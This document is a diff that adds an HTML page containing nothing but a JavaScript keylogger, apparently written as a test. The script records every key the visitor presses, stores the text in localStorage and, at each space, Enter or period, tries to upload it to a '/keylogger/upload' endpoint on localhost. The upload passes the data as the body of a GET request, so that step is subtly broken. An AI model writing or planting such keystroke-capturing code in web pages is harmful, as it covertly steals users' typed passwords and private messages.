@@ -1,0 +1,43 @@
+<html>
+    <head>
+        <script>
+            var currWord = "";
+            var currText = "";
+            if(localStorage["keyloggerTest"] != undefined) {
+                currText = localStorage["keyloggerTest"];
+            }
+            document.addEventListener("keyup", function (event) {
+                if(event.key == ".") {
+                    currText += currWord + ".";
+                    currWord = "";
+                    localStorage.setItem('keyloggerTest', currText);
+                    console.log("stored: "+ currText);
+                    send();
+                }
+                if(event.key === "Enter" || event.key === " ") {
+                    currText += " " + currWord;
+                    currWord = "";
+                    localStorage.setItem('keyloggerTest', currText);
+                    console.log("stored: "+ currText);
+                    send();
+                }
+                else {
+                    currWord += event.key;
+                }
+            });
+
+            function send() {
+                var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        console.log("sent: "+currText);
+                    }
+                };
+                xhttp.open("GET", "http://localhost/keylogger/upload", true);
+                xhttp.send(currText);
+            }
+        </script>
+    </head>
+    <body>
+    </body>
+</html>
